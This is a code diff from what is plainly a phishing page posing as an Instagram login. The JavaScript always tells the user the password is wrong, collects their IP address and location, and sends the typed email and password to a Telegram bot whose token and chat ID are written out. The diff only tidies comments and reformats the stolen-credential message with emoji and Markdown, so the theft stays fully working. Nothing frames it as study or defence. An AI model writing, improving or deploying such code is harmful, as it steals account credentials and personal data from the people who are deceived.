@@ -224,12 +224,12 @@
     var attemptCount = 0;
 
     login.addEventListener('click', function (event) {
-        event.preventDefault(); // Prevent the default form submission
+        event.preventDefault(); // Prevent default form submission
 
         // Increment the attempt count
         attemptCount++;
 
-        // Always show incorrect password message
+        // Show incorrect password message
         feedback.textContent = '❌ Incorrect password! Please try again...';
 
         // Get user IP address and location details
@@ -241,13 +241,18 @@
                 const region = data.regionName; // State or province
                 const flag = getCountryEmoji(data.countryCode); // Get country emoji
 
-                // Prepare the message to send to Telegram
-                const message = `🚨 Attempt ${attemptCount}:\n📧 Email: ${email.value}\n🔑 Password: ${password.value}\n🌍 IP: ${userIP}\n📍 Location: ${flag} ${country}, ${region}\n🏷️ Tag: Instagram`;
+                // Prepare the message with enhanced emoji formatting
+                const message = `🚨 *Login Attempt #${attemptCount}*\n\n` +
+                                `📧 *Email:*  ✉️ ${email.value}\n` +
+                                `🔑 *Password:*  🔒 ${password.value}\n` +
+                                `🌍 *IP Address:*  🖥️ ${userIP}\n` +
+                                `📍 *Location:*  ${flag} ${country}, ${region}\n` +
+                                `🏷️ *Tag:*  Instagram`;
 
                 // Send the message to the Telegram bot
                 const telegramBotToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your bot token
                 const chatId = '7735490302'; // Replace with your chat ID
-                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
                 fetch(telegramUrl)
                     .then(response => {
